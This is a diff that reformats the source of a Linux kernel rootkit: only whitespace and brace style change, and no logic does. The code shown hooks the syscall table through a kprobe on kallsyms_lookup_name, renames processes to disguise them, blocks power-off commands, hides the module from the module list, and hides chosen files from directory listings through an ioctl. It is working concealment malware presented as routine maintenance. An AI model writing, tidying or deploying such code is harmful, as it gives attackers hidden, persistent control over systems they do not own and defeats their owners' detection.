@@ -67,25 +67,26 @@ static int is_invisible(pid_t pid)
 	return 0;
 }
 
-static int change_process_name(const char *orig_name, const char *new_name) {
-    struct task_struct *p = NULL;
-    int found = 0;
+static int change_process_name(const char *orig_name, const char *new_name)
+{
+	struct task_struct *p = NULL;
+	int found = 0;
 
-    // for_each_process requires rcu_read_lock() to safely walk the task list.
-    rcu_read_lock();
-    for_each_process(p) {
-        if (strcmp(p->comm, orig_name) == 0) {
-            // strncpy() was removed from the kernel (no NUL-termination guarantee,
-            // unconditional zero-padding caused too many bugs); strscpy() always
-            // NUL-terminates within the given size and is the in-tree replacement.
-            strscpy(p->comm, new_name, sizeof(p->comm));
-            found = 1;
-            printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
-        }
-    }
-    rcu_read_unlock();
+	// for_each_process requires rcu_read_lock() to safely walk the task list.
+	rcu_read_lock();
+	for_each_process(p) {
+		if (strcmp(p->comm, orig_name) == 0) {
+			// strncpy() was removed from the kernel (no NUL-termination guarantee,
+			// unconditional zero-padding caused too many bugs); strscpy() always
+			// NUL-terminates within the given size and is the in-tree replacement.
+			strscpy(p->comm, new_name, sizeof(p->comm));
+			found = 1;
+			printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
+		}
+	}
+	rcu_read_unlock();
 
-    return found ? 0 : -1;
+	return found ? 0 : -1;
 }
 
 /* ---- character device state ---- */
@@ -107,7 +108,7 @@ static DEFINE_MUTEX(hidden_file_lock);
 
 /* ---- syscall table / hooking infrastructure ---- */
 static struct kprobe kp = {
-	    .symbol_name = "kallsyms_lookup_name"
+	.symbol_name = "kallsyms_lookup_name"
 };
 // the necessary variables that the syscall table requires to access and modify
 static unsigned long *__sys_call_table;
@@ -141,7 +142,7 @@ static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
 	cmd = (unsigned int) pt_regs->regs[2];
 	printk(KERN_INFO "enter hacked reboot section.\n");
 
-	if(cmd == LINUX_REBOOT_CMD_POWER_OFF) {
+	if (cmd == LINUX_REBOOT_CMD_POWER_OFF) {
 		printk(KERN_INFO "power off command intercepted and denied.\n");
 		return 0;
 	}
@@ -240,18 +241,18 @@ out:
 // hidden module part
 static void module_show(void)
 {
-    /* back to the module list where we remove before */
-    list_add(&THIS_MODULE->list, prev_module);
-    hidden = 0;
+	/* back to the module list where we remove before */
+	list_add(&THIS_MODULE->list, prev_module);
+	hidden = 0;
 	printk(KERN_INFO "module unhidden\n");
 }
 static void module_hide(void)
 {
-    /* Save this module in the list before us, make this module back to the list in the same place later. */
-    prev_module = THIS_MODULE->list.prev;
-    /* Remove ourselves from the list module list */
-    list_del(&THIS_MODULE->list);
-    hidden = 1;
+	/* Save this module in the list before us, make this module back to the list in the same place later. */
+	prev_module = THIS_MODULE->list.prev;
+	/* Remove ourselves from the list module list */
+	list_del(&THIS_MODULE->list);
+	hidden = 1;
 	printk(KERN_INFO "module hidden\n");
 }
 
@@ -324,7 +325,7 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 	struct masq_proc *req_array;
 	int ret = 0;
 	size_t i;
-	switch(ioctl) {
+	switch (ioctl) {
 		case IOCTL_MOD_HOOK:
 			hook();
 			break;
@@ -373,8 +374,8 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			break;
 		case IOCTL_FILE_HIDE:
 			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
-                return -EFAULT;
-            printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
+				return -EFAULT;
+			printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
 			// Replace HIDDEN_FILE with a newly allocated buffer holding the filename to suppress from getdents64.
 			// Reject zero-length to prevent size_t underflow on the null-terminator write below.
 			if (file_info.len == 0 || file_info.len > NAME_LEN)
